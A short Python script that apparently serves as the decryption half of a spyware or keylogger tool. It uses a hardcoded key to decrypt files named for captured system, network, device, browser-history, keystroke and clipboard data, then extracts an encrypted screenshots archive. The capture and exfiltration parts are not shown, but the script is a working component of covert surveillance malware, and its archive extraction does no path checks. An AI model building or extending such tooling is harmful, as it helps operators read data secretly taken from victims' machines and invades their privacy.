import os
import tarfile
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def symmetric_decrypt(encrypted_data, key):
    iv = encrypted_data[:16]
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(encrypted_data[16:]) + decryptor.finalize()

def decrypt_files():
    symmetric_key = hashlib.sha256(b"this_is_a_secret_key").digest()
    files_to_decrypt = ["system_info.txt.enc", "connected_devices.txt.enc", "network_info.txt.enc", "browser_history.txt.enc", "keylogger.txt.enc", "keylogger_letters.txt.enc", "clipboard.txt.enc"]
    
    for file in files_to_decrypt:
        try:
            with open(file, "rb") as f:
                encrypted_data = f.read()
            data = symmetric_decrypt(encrypted_data, symmetric_key)
            with open(file[:-4], "wb") as f:
                f.write(data)
            os.remove(file)
        except FileNotFoundError:
            continue

def decrypt_screenshots_folder():
    symmetric_key = hashlib.sha256(b"this_is_a_secret_key").digest()
    tar_file = "screenshots.tar.gz.enc"
    
    with open(tar_file, "rb") as f:
        encrypted_data = f.read()
    
    data = symmetric_decrypt(encrypted_data, symmetric_key)
    
    with open("screenshots.tar.gz", "wb") as f:
        f.write(data)
    
    with tarfile.open("screenshots.tar.gz", "r:gz") as tar:
        tar.extractall()
    
    os.remove("screenshots.tar.gz")

decrypt_files()
decrypt_screenshots_folder()
